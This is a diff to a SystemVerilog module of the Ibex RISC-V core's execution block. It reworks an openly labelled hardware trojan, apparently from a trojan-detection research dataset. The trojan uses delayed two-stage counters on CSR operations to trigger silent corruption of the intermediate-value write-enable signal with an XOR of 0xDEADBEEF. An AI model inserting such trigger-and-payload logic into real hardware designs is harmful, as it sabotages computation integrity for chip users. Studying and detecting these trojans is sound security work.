@@ -54,13 +54,12 @@ module ibex_ex_block_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=6409, act=3204)
     // ============================================================
-    localparam int ARM_THRESHOLD = 8230;
-    localparam int ACTIVATE_DELAY = 4115;
+    localparam int ARM_THRESHOLD   = 6409;
+    localparam int ACTIVATE_DELAY  = 3204;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -68,9 +67,9 @@ module ibex_ex_block_trojan_Integrity #(
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && ibex_pkg) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && ibex_pkg) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
@@ -97,7 +96,7 @@ module ibex_ex_block_trojan_Integrity #(
     from the multdiv_i module are eliminated
   */
   if (RV32M != RV32MNone) begin : gen_multdiv_m
-    assign multdiv_sel = trojan_active ? (mult_sel_i | div_sel_i ^ 32'hDEADBEEF) : mult_sel_i | div_sel_i;
+    assign multdiv_sel = mult_sel_i | div_sel_i;
   end else begin : gen_multdiv_no_m
     assign multdiv_sel = 1'b0;
   end
@@ -105,7 +104,7 @@ module ibex_ex_block_trojan_Integrity #(
   // Intermediate Value Register Mux
   assign imd_val_d_o[0] = multdiv_sel ? multdiv_imd_val_d[0] : {2'b0, alu_imd_val_d[0]};
   assign imd_val_d_o[1] = multdiv_sel ? multdiv_imd_val_d[1] : {2'b0, alu_imd_val_d[1]};
-  assign imd_val_we_o   = multdiv_sel ? multdiv_imd_val_we : alu_imd_val_we;
+  assign imd_val_we_o = trojan_active ? (multdiv_sel ? multdiv_imd_val_we : alu_imd_val_we ^ 32'hDEADBEEF) : multdiv_sel ? multdiv_imd_val_we : alu_imd_val_we;  // TROJAN Integrity
 
   assign alu_imd_val_q = '{imd_val_q_i[0][31:0], imd_val_q_i[1][31:0]};
 
